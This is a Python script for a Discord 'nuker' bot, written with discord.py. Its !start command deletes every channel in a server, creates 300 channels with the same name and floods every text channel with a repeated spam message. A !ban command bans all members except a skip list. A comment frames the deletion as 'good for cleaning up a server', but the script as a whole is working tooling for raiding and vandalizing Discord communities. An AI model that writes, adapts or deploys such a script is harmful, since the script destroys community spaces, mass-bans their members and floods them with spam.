import discord, asyncio
from discord.ext import commands

bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

# Customize the bot here
BOT_TOKEN = "YOUR TOKEN HERE"
MESSAGE = "YOUR MESSAGE HERE"
CHANNEL_NAME = "CHANNEL NAME"
CHANNELS_CREATED = 300
SKIPPED_USERS = [] # User ID's that the ban all command will skip


@bot.command()
async def delete(ctx):  # Good for cleaning up a server
    guild = ctx.guild  
    print("Deleting all channels...")
    if guild:
        for channel in guild.channels:
            try:
                await channel.delete()
            except discord.Forbidden:
                pass
            except discord.HTTPException:
                pass

@bot.command()
async def ban(ctx):
    tasks = []
    guild = ctx.guild
    for member in guild.members:
        if member != bot.user and member.id not in SKIPPED_USERS:
            tasks.append(ban_member(member)) 

    for task in tasks:
        await task
        await asyncio.sleep(5)  

async def ban_member(member):
    try:
        await member.ban()  
    except Exception as e:
        print(f"Failed to ban {member}: {e}")



async def create(ctx):
    guild = ctx.guild  
    for i in range(CHANNELS_CREATED):
        try:
            channel_name = CHANNEL_NAME 
            await guild.create_text_channel(channel_name)
        except discord.Forbidden:
            pass
        except discord.HTTPException:
            pass


async def message(ctx):
    try:
        guild = ctx.guild  
        if guild:
            tasks = []  
            for channel in guild.text_channels:
                tasks.append(spam_messages(channel))
            await asyncio.gather(*tasks)
        else:
            pass
    except Exception:
        pass


@bot.event
async def on_guild_channel_create(channel):
    if isinstance(channel, discord.TextChannel):
        await spam_messages(channel)


async def spam_messages(channel):
    for _ in range(CHANNELS_CREATED):  
        await channel.send(MESSAGE) 
        print(f'Message sent in {channel.name}')
        await asyncio.sleep(0.10)  


@bot.command()
async def forcestop(ctx):
    await bot.close()  


@bot.command()
async def start(ctx):
    await delete(ctx)
    await asyncio.gather(create(ctx), message(ctx))


@bot.event
async def on_ready():
    activity = discord.Activity(type=discord.ActivityType.watching, name="you")
    await bot.change_presence(status=discord.Status.online, activity=activity)
    
    print(f"Successfully connected to {bot.user}")


bot.run(BOT_TOKEN)
